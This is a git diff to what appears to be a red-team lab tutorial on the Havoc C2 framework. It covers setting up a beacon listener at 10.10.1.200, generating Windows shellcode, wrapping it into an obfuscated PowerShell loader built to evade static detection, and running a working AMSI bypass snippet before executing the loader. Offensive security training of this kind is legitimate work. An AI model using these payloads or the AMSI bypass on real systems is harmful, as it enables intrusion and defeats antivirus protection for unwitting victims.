@@ -63,10 +63,11 @@ A listener acts as the endpoint for compromised systems (Beacons), allowing them
 ![image](https://github.com/user-attachments/assets/b8be2d9e-eb5f-4ee5-8cbc-756619b76cf8)
 
 3. Fill in the required fields:
-![image](https://github.com/user-attachments/assets/40ab7727-9976-4d26-9c45-5db9ec205d1f)
+<img width="400" height="700" alt="image" src="https://github.com/user-attachments/assets/f5a1511f-fc17-46d2-bb79-265d7e2f5bb2" /> 
 
-Here, you provide the IP addresses and/or domain names that the Beacon payload will call back to. 
-By default, it will auto-populate with the IP address of the Attacker Kali VM.
+- Name: `any name you like`
+- Payload: `http` or `https`
+- Hosts: `10.10.1.200`, just click ADD and it will autopopulate
 
 4. Click `Save` to activate the listener.
 
@@ -89,10 +90,14 @@ We are going to create a raw Windows shellcode binary (beacon.bin) that initiate
 
 3. Click Generate
 
-Save the generated Windows Shellcode payload in the following folder:
+4. Save the generated Windows Shellcode payload in the following folder:
 ```
 /home/kali/Havoc/obfuscator/beacon.bin
-```
+``` 
+<img width="1548" height="822" alt="image" src="https://github.com/user-attachments/assets/ca9f3e5a-f1bb-4963-b483-7a091c325e49" />
+
+You can replace the old `beacon.bin` file on the folder.
+
 The output file (beacon.bin) contains the raw shellcode ready for embedding into custom loaders, BOFs, or shellcode injection frameworks.
 
 ## Converting beacon.bin to a PowerShell Loader with a Python Obfuscator Script
@@ -106,17 +111,21 @@ Using the Python Obfuscator Script `havoc_obfuscate_ps1.py`, we will wrap our bi
 This enables fileless execution and evades simple static detection mechanisms.
 
 ### Steps to Generate the Powershell Loader
-1. Ensure your "beacon.bin" is generated and located in the working directory:
+1. Open a new terminal TAB and access the following directory:
 ```
-/home/kali/Havoc/obfuscator/beacon.bin
+cd Havoc/obfuscator/
 ```
-2. Run the Python script to encrypt and embed the shellcode into a PowerShell loader:
+2. Ensure your new payload `beacon.bin` file is generated and located in the same working directory:
+
+3. Run the Python script to encrypt and embed the shellcode into a PowerShell loader:  
+
 ![image](https://github.com/user-attachments/assets/0f1140c0-b849-4535-b30c-6de856fbc4d7)
 
 ```bash
 python3 havoc_obfuscate_ps1.py beacon.bin
 ```
-3. The script outputs `beacon_loader_obfuscated.ps1`, which is now ready for use in initial access.
+4. The script outputs `beacon_loader_obfuscated.ps1`, which is now ready for use in initial access.
+
 ![image](https://github.com/user-attachments/assets/ffa81919-ced3-4833-a1e7-94e20236ced2)
 
    
@@ -135,12 +144,12 @@ This gives us more control over execution and helps ensure in-memory delivery of
 ```
 3. Do the same for our generated `beacon_loader_obfuscated.ps1` Powershell loader:
 
-4. Inject AMSI Bypass (line by line):
+4. Inject AMSI Bypass:
 ```powershell
 $a=([ref].Assembly.GetTypes() | ? { $_.Name -like '*Amsi*' }).DeclaredFields | ?  { $_.Name -eq 'amsiInitFailed' }
 $a.SetValue([void]0, $true)
 ```
-Paste each line of your AMSI bypass code individually into the PowerShell_ISE command pane and execute per line.
+Paste the AMSI bypass code into the PowerShell_ISE command pane and press ENTER to execute it.
 
 5. Copy, paste and execute the loader:
 ![image](https://github.com/user-attachments/assets/bbb273e7-155a-4e37-b97e-1d7abb5e5fe2)
